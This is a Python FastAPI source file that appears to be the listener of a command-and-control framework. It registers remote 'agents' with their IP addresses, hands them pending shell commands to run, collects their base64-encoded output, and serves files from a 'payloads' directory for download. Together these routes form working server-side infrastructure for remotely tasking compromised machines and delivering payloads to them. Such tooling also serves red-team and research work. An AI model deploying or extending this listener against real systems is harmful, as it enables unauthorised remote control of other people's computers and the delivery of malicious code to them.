from fastapi import APIRouter, Request, HTTPException
from fastapi.responses import FileResponse
from models import AgentRegister, Result, Agent
from server.agents_manager import add_agent, get_pending_task_to_agent, get_agent_result
from uuid import uuid4
from base64 import b64decode
import os


PAYLOADS_DIR = os.path.abspath("payloads")


def listener_start(listener_name: str) -> APIRouter:
    router = APIRouter()

    @router.post("/reg")
    def register_agent(register_in: AgentRegister, req: Request):
        agent_data = register_in.model_dump()
        agent_data["name"] = "agent_" + str(uuid4())
        agent_data["ip"] = req.client.host
        agent_data["listener_name"] = listener_name

        agent = Agent(**agent_data)
        add_agent(agent)
        return {"name": agent.name}

    @router.get("/tasks/{name}")
    def retrieve_tasks(name: str):
        task = get_pending_task_to_agent(name)
        if not task:
            return None
        return {"id": task.id, "command": task.command}

    @router.post("/results/{name}")
    def receive_results(result: Result, name: str):
        raw_bytes = b64decode(result.output)
        try:
            output = raw_bytes.decode("utf-8")
        except UnicodeDecodeError:
            output = raw_bytes.decode("utf-8", errors="replace")
        result_decoded = Result(
            task_id=result.task_id,
            agent_name=result.agent_name,
            output=output
        )
        get_agent_result(result_decoded)
        return {"status": "Ok"}

    @router.get("/download/{file}")
    def download_file(file: str):
        safe_filename = os.path.basename(file)
        file_path = os.path.abspath(os.path.join(PAYLOADS_DIR, safe_filename))
        
        if not file_path.startswith(PAYLOADS_DIR):
            raise HTTPException(status_code=403, detail="Access denied")
        
        if not os.path.exists(file_path):
            raise HTTPException(status_code=404, detail="File not found")

        return FileResponse(
            path=file_path,
            filename=safe_filename,
            media_type="application/octet-stream"
        )

    return router
